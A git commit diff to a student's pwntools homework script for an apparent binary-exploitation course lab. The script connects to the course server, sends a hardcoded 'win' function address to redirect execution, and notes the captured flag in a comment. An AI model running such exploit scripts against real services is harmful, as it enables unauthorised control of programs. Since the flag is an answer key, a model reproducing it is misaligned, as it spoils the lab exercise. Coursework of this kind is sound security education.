52532c7a0a6dd8fca350d1b971425f6a68cb9fae
Kevin Wafula <95890992+kwafula@users.noreply.github.com>
2023-09-03 21:14:57 -0400

    Update lab1-2.py

--- Homework-01/lab1-2.py
+++ Homework-01/lab1-2.py
@@ -1,27 +1,29 @@
 from pwn import *
+import os
 
 # connect to local binary process
-# p = processs("./lab1-1.bin")
+# p = processs("./lab1-2.bin")
 
 # connect to remote server process at port 7011
-p = remote("csc748.hostbin.org", 7011)
+p = remote("csc748.hostbin.org", 7012)
 
-# read data upto secret string
-p.recvuntil(b"\n\n")
+# read response
+response = p.recvline()
 
-# get and print secret string 
-s = p.recv(15)
-print(f"The secret string was: {s}")
+# print response
+# s = p.recv(15)
+print(f"The secret string was: {response}")
 
-# send back secret string
-p.sendline(s)
+# send back hardcoded address of "win" fiction in decimal
+# "win" function address is 0x40130f or 4199183 in decimal
+p.sendline(4199183)
 
 # establish interactive session 
 p.interactive()
 
-# add code to print flag.txt
-
-# function address to call is 0x40130f or 4199183 in decimal
+# print flag.txt
 # Flag to fetched is: flag{082f90215133f4755f27ec6850b1eecc}
+os.system("cat flag.txt")
+
 
 
